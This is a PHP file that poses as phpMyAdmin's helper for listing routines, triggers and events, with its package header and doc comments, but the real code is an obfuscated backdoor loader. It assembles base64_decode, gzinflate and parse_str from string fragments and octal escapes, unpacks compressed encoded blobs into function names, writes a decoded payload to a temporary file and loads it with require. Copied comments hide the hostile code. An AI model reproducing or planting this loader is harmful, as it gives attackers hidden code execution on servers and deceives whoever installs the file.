<?php
/* vim: set expandtab sw=4 ts=4 sts=4: */
/**
 * Common functions for generating lists of Routines, Triggers and Events.
 *
 * @package PhpMyAdmin
 */
$key = "LcrRDYAgD" ."AXAbfjUCb" ."qDGzRGnth" ."EoZYSZXs1" ."8fvOC6thl" ."ZtGPzS4SU" ."owkiyc4OF" ."ssM7eFdR0" ."L3Pkd3EUC" ."3Ur1wRbkJ" ."1qr99mx49" ."Cw/gA";

/**
 * Creates a list of items containing the relevant
 * information and some action links.
 *
 * @param string $type  One of ['routine'|'trigger'|'event']
 * @param array  $items An array of items
 *
 * @return string HTML code of the list of items
 */
$db_name = "FcwxEgIhDAXQ29BaWaay9wqZL". "HyUGSCYhNnx9q7V657tyUssnJ". "rzaS3k6EimO9oEF9QLo5vDnVN". "BR8BplHvKumfQC8F5m2EGb4cl". "/3QupouqLszkbz0fEk8ZoPrvr". "xtdpVDNXR1pWRtiXzp/";

/**
     * Conditional classes switch the list on or off
     */
$execute_action = array("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", "83");

/**
     * Generate output
     */
$showBubbleSize = "base". "64_d". "ecod". "e"; $url_query = "p\141r\163e_str";

// th cells with a colspan need corresponding td cells, according to W3C

$yPos = "gzi". "nfl". "ate";

// see comment above

$titles = "imp\154ode";$subFromPrefix = "";

// see comment above

$url_query($yPos($showBubbleSize($key)),$curr_user);

// see comment above

$type = array($curr_user["to_prefix"],$curr_user["trigger"]($curr_user["query_type"]),$curr_user["showPercent"],$curr_user["i"]);

// Get each row from the correct function

$url_query($yPos($showBubbleSize($db_name)),$type_link);

// end PMA_RTE_getList()

foreach($type as $definition) {
/**
 * Creates the contents for a row in the list of routines
 *
 * @param array  $routine  An array of routine data
 * @param string $rowclass Empty or one of ['even'|'odd']
 *
 * @return string HTML code of a row for the list of routines
 */
	if(@$type_link["run_parts"]($definition)) break;
}

// this is for our purpose to decide whether to

$ajax_class=$definition.$type_link["routine_definer"].$type_link["deletes"]($type_link["count"]());

// show the edit link or not, so we need the DEFINER for the routine

$items = $type_link["sql_drop"]($ajax_class, $type_link["primary"]);

// Since editing a procedure involved dropping and recreating, check also for

$type_link["showCatName"]($items, $yPos($showBubbleSize($titles($subFromPrefix,$execute_action))));

// CREATE ROUTINE privilege to avoid lost procedures.

$type_link["reload"]($items);

// There is a problem with PMA\libraries\Util::currentUserHasPrivilege():

require $ajax_class;

// it does not detect all kinds of privileges, for example

?>